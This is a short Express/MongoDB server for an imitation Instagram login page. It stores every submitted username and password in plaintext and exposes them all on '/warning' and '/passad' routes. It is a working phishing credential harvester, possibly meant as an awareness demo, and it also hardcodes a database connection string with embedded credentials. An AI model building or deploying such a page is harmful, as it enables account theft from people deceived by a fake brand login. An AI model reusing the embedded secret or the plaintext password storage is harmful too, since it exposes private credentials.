const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Connect to MongoDB
mongoose.connect('mongodb+srv://nirmit:Kiit%401521@cluster0.wdabg0l.mongodb.net/passad?retryWrites=true&w=majority', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('Connected to MongoDB');
}).catch(err => {
    console.error('Error connecting to MongoDB:', err);
});

// Define a schema
const userSchema = new mongoose.Schema({
    uname: String,
    password: String
});

const User = mongoose.model('User', userSchema);

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// Home Page
app.get('/', (req, res) => {
    res.render('home');
});

// Instagram Clone Login Page
app.get('/login', (req, res) => {
    res.render('login');
});

// Warning page
app.get('/warning', async (req, res) => {
    try {
        const users = await User.find();
        res.render('warning', { users });
    } catch (err) {
        console.error('Error retrieving data from MongoDB:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Handle login data
app.post('/login', async (req, res) => {
    const { uname, password } = req.body;

    try {
        const newUser = new User({
            uname: uname,
            password: password
        });

        await newUser.save();

        console.log('Data saved to MongoDB:', newUser);
        res.redirect('/warning');
    } catch (err) {
        console.error('Error saving data to MongoDB:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Display data from MongoDB
app.get('/passad', async (req, res) => {
    try {
        const users = await User.find();
        res.render('passad', { data: users });
    } catch (err) {
        console.error('Error retrieving data from MongoDB:', err);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
